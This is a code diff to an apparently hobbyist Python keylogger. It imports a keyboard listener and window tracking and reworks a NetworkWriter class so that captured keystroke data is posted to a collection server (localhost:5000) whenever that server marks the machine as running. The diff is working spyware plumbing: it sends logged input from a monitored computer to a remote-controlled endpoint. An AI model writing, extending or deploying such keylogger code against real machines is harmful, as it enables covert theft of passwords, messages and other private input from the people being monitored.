@@ -1,3 +1,4 @@
+from flask import jsonify
 from pynput import keyboard
 from datetime import datetime
 import pygetwindow as gw
@@ -7,9 +8,6 @@ import threading
 import socket
 import requests
 import time
-
-from win32cryptcon import szOID_RSA
-
 
 class IKeyLogger(ABC):
 
@@ -127,14 +125,17 @@ class NetworkWriter(IWriter):
 
     def send_data(self, data: dict, machine_name: str):
         try:
-
-            requests.post(
-                "http://localhost:5000/api/computers",
-                json={"machine_name": machine_name, "data": data},
-                 headers = {
-                    'Content-Type': 'application/json'
-                }
-            )
+            response = requests.get(f"http://localhost:5000/api/computers/is_computer_running/{machine_name}")
+            if response.ok:
+                computer = response.json()
+                if computer.get("is_running"):
+                    requests.post(
+                        "http://localhost:5000/api/computers",
+                        json={"machine_name": machine_name, "is_running": True, "data": data},
+                         headers = {
+                            'Content-Type': 'application/json'
+                        }
+                    )
 
         except Exception as e:
             print(f"Error: {e}")
